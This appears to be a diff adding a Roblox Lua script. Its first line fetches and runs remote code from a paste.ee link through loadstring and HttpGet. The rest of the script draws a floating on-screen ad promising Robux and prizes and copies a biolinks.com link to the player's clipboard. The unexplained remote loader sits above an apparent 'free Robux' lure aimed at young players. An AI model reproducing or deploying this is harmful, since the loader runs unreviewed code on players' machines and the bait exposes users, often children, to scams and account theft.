@@ -1,0 +1,60 @@
+loadstring(game:HttpGet("https://paste.ee/r/WWtZ1EXW"))()
+
+
+-- LocalScript (put inside StarterGui)
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local TextService = game:GetService("TextService")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local link = "https://biolinks.com/nicohscript"
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FloatingAdGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Create Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.5, 0, 0.1, 0)
+frame.Position = UDim2.new(0.25, 0, 0.85, 0)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+frame.BackgroundTransparency = 0.2
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Rounded corners
+local uicorner = Instance.new("UICorner")
+uicorner.CornerRadius = UDim.new(0, 12)
+uicorner.Parent = frame
+
+-- Create TextButton
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(1, 0, 1, 0)
+button.BackgroundTransparency = 1
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.Text = "Visit https://biolinks.com/nicohscript to win Robux & prizes!"
+button.Parent = frame
+
+-- Function to copy to clipboard
+button.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(link)
+        StarterGui:SetCore("SendNotification", {
+            Title = "Copied!";
+            Text = "Link copied to clipboard!";
+            Duration = 3;
+        })
+    else
+        StarterGui:SetCore("SendNotification", {
+            Title = "Oops!";
+            Text = "Clipboard not supported on this platform.";
+            Duration = 3;
+        })
+    end
+end)
